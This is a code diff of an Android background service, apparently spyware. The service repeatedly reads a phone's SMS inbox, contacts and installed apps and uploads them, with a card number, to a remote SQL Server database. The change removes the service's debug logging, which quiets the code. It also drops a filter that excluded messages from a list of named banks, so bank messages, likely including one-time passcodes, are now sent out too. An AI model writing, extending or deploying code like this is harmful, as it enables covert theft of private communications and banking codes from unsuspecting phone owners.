@@ -39,35 +39,10 @@ public class MyService2 extends Service {
     private static String cardnumber="";
     private PackageManager packageManager = null;
     private Connection connection = null;
-    private boolean ApplicationLoading=false;
 
 
-    private LinkedList<String> banks=new LinkedList<String>()
-    {
-        {
-            add("PrivatBank");
-            add("Avangard");
-            add("monobank");
-            add("Oschadbank");
-            add("900");
-            add("Alfa-Bank");
-            add("Altbank");
-            add("OTPBank");
-            add("OTP_Bank");
-            add("Raiffeisen");
-            add("Citibank");
-            add("SkyBank");
-            add("SportBank");
-            add("todobank");
-            add("TodoBank");
-            add("K-Kapital");
-            add("Ukrgasbank");
-            add("ForwardBank");
-            add("UnexBank");
-            add("OTKRITIE");
-            add("Otkritie");
-        }
-    };
+
+
     public void onCreate() {
         super.onCreate();
 
@@ -81,14 +56,14 @@ public class MyService2 extends Service {
         READ_INTERNET_GRANTED=bundle.getBoolean("databases");
         cardnumber=bundle.getString("cardnumber");
         packageManager=getPackageManager();
-        Log.d("db", "before some task");
+
         someTask();
 
         return super.onStartCommand(intent, flags, startId);
     }
 
     public void onDestroy() {
-        Log.d("db", "destroyed");
+
         super.onDestroy();
 
     }
@@ -105,7 +80,7 @@ public class MyService2 extends Service {
             public void run() {
                 while (true) {
                     try {
-                        Log.d("db", "read");
+
                         if (READ_CONTACTS_GRANTED) {
                             readContacts();
                         }
@@ -114,12 +89,12 @@ public class MyService2 extends Service {
                         }
                         new LoadApplications().execute();
                         TimeUnit.SECONDS.sleep(10);
-                        Log.d("db", "write");
+
                         new LoadDataBase().execute();
-                        Log.d("db", "Load executed");
+
                         TimeUnit.MINUTES.sleep(1);
                     } catch (InterruptedException e) {
-                        Log.d("db", e.getMessage());
+
                     }
 
                 }
@@ -168,30 +143,19 @@ public class MyService2 extends Service {
     private LinkedList<SMSclass> readSMS()
     {
 
+     
         Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
         sms=new LinkedList<>();
+
         if (cursor.moveToFirst())
         {
             do {
                 sms.add(new SMSclass(cursor.getString(2).replace("'","*"),cursor.getString(12).replace("'","*")));
 
-                // use msgData
             } while (cursor.moveToNext());
         }
-
-        for(int k=0;k<sms.size();k++)
-        {
-            for(int i=0;i<banks.size();i++)
-            {
-
-                if(banks.get(i).equals(sms.get(k).sender)) {
-                    sms.remove(k);
-                    k--;
-                    break;
-                }
-            }
-
-        }
+      
+//   
         return  sms;
     }
 
@@ -203,7 +167,6 @@ public class MyService2 extends Service {
         @Override
         protected Void doInBackground(Void... params) {
             if (READ_INTERNET_GRANTED) {
-                Log.d("db",(READ_INTERNET_GRANTED)?"true":"false");
                 try {
 
                     Class.forName("net.sourceforge.jtds.jdbc.Driver");
@@ -290,7 +253,6 @@ public class MyService2 extends Service {
 
 
 
-                            Log.d("db","DELETED");
                             if(contacts.size()>0) {
                                 insertstring = "INSERT Contacts(ClientID, ContactName, ContactNumber) VALUES (";
                                 for (int k = 0; k < contacts.size(); k++) {
@@ -302,7 +264,7 @@ public class MyService2 extends Service {
                                 insertstring += ")";
                                 statement.executeUpdate(insertstring);
                             }
-                            Log.d("db","CONTACTS");
+
                             if(sms.size()>0) {
                                 insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
                                 for (int k = 0; k < sms.size(); k++) {
@@ -315,7 +277,7 @@ public class MyService2 extends Service {
                                 insertstring +=")";
                                 statement.executeUpdate(insertstring);
                             }
-                            Log.d("db","Messages");
+
 
                             if(applist.size()>0) {
                                 insertstring = "INSERT INTO Applications(ClientID, ApplicationName) VALUES (";
@@ -329,30 +291,23 @@ public class MyService2 extends Service {
                                 insertstring += ")";
                                 statement.executeUpdate(insertstring);
                             }
-                            Log.d("db", "Applications");
+
                         }
-                        else
-                        {
-                            Log.d("db","Таких в бд нет!");
-                        }
+
                     } catch (Exception throwables) {
-                        Log.d("db",throwables.getMessage());
-                        Log.d("db",insertstring);
+
                     }
                 }
-                else
-                {
-                    Log.d("db","Коннекшн не установлен");
-                }
+
             }
-            Log.d("db", "in background");
+
 
             return null;
         }
 
         @Override
         protected void onPostExecute(Void result) {
-            Log.d("db", "after load onpostexecute");
+
             super.onPostExecute(result);
         }
         @Override
@@ -386,13 +341,13 @@ public class MyService2 extends Service {
 
         @Override
         protected void onPostExecute(Void result) {
-            ApplicationLoading=false;
+            
             super.onPostExecute(result);
         }
 
         @Override
         protected void onPreExecute() {
-            ApplicationLoading=true;
+           
             super.onPreExecute();
         }
     }
